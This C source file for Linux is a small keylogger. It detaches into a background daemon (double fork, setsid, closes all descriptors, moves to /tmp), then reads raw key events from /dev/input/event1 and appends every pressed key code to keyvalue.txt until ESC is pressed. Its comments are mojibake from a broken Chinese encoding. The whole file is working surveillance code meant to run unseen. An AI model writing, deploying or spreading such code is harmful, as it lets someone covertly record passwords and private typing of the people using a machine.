#include "definefile.h"
#include <linux/input.h>
//�鿴����ʹ���豸��Ӧ�豸�ļ�
//[root@localhost input]# proc/bus/input
//[root@localhost input]# cat devices
//�ػ�������ȡ�û����������ַ�
int  openfile()
{
     int fd=open("keyvalue.txt",O_CREAT|O_EXCL|O_WRONLY,0777);
     if(errno==EEXIST)
     {
         fd=open("keyvalue.txt",O_WRONLY);
     }
     return fd;
}
void savetofile(int fd,char *ch)
{
    int len=write(fd,ch,strlen(ch));
}
void closefile(int fd)
{
    close(fd);
}
void  getkeypressvalue()
{
    int fd;
    int key_value,i=0,count;
    struct input_event event,press_event;
    fd = open("/dev/input/event1", O_RDWR);
    if (fd < 0)
   {
             perror("open device buttons:");
             exit(1);
    }
int savefd=openfile();
if (savefd < 0)
{
         perror("open save text:");
         exit(1);
}
char buf[100];
while(1)
       {
               if(read(fd, &event, sizeof(event)) == sizeof(event))
               {
                   if (event.type == EV_KEY)
                   {
                       if ( event.value == 1)
                       {
                           bzero(buf,sizeof(buf));
                           sprintf(buf,"%d prssed",event.code);
                            //   printf("key %d %s\n", event.code, (event.value) ? "Pressed" : "Released");
                            savetofile(savefd,buf);
                             if(event.code == KEY_ESC)
                                       break;
                       }
                 }
               }
       }
close(fd);
}

void init_daemon()
{
   int pid;
   int i;
   pid=fork();
   if(pid>0)//����������
	  exit(0);
   else if(pid<0)
	  exit(1);
   setsid();//�õ�һ���ӽ��̳�Ϊ�������鳤
   pid=fork();//ȡ���ӽ���������ն� �ļ��Ĺ�ϵ,���ҷ�ֹ���´��ĵĿ����ն�
   if(pid>0)//�رյ�һ���ӽ���
	  exit(0);
   else if(pid<0)
	  exit(1);
   //�ر������ļ�
   //�Ǵ�������ļ�����
   for(i=0;i<1024;i++)
   {
	   close(i);
   }
   chdir("/tmp");//�ı乤��Ŀ¼
   umask(0);//�ı�����
}

int main(void)
{
    init_daemon();
    getkeypressvalue();
    return 0;
}
